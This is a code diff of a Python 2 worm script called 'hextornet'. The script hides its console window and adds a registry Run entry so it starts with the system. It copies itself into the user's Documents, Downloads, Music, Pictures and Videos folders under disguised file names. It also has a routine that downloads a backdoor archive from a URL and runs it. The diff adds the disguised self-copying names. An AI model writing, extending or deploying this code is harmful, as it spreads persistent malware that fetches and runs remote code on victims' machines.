@@ -23,30 +23,22 @@ print(
 """
 )
 
-#Use in windows
-"""
-	if(os.path.isdir("E:\\")):
-		dst = "E:" + "\\hextornet.py"
-	elif(os.path.isdir("C:\\")):
-		dst = "C:\\Users\\" + usr + "\\hextornet.py"
-	
-	else:
-		dst = os.getcwd() + "hextornet.py"
-"""
-
-src = os.path.abspath("hextornet.py")
+src = os.path.abspath('hextornet.py')
 usr = getpass.getuser()
 lang = locale.getdefaultlocale()
+
 directories = ""
-
-
-directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
 dst = ""
+
+hextornet = ['winHex.py', 'Hxtprocess.py', 'HXTNet.py', 'HxWinProcess.py']
+directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
+
 
 def hide():
 	window = win32console.GetConsoleWindow()
 	win32gui.ShowWindow(window,0)
 	return True
+
 
 def addStartup():
     fp = os.path.dirname(os.path.realpath(__file__))
@@ -58,11 +50,13 @@ def addStartup():
 
     SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)
 
+
 def windows_client(system = sys.platform):
     if system.startswith('win'):
         return True
     else:
 	return False
+
 
 def linux_client(system = sys.platform):
     if system.startswith('linux'):
@@ -79,13 +73,16 @@ def propagate():
 	while len(directories) != 0:
 		for directory in directories:
 			if(windows_client):
-				dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + "hextornet.py"
-				copyfile(src, dst)
-				print'dst',dst
+				for hexworm in hextornet:
+					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
+					copyfile(src, dst)
+					print'dst',dst
+
 			elif(linux_client):
-				dst = 'root' + usr + '/' + directory + '/' + 'hextornet.py'
-				copyfile(src, dst)
-				print'dst',dst
+				for hexworm in hextornet:
+					dst = '/root' + usr + '/' + directory + '/' + str(hexworm) + '.py'
+					copyfile(src, dst)
+					print'dst',dst
 			else:
 				dst = os.getcwd() + "hextornet.py"
 			directories.remove(directory)
@@ -117,11 +114,15 @@ def downloadBackDoor(url):
         run(os.path.abspath(filename))
 	print "==========finish downloading=========="
 
+
 def run(program):
 	process = sp.Popen('python '+program, shell=True)
 	process.wait()
 
+
 def main():
+	#hide()
+	#addStartup()
 	propagate()
 	#hide()
 	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
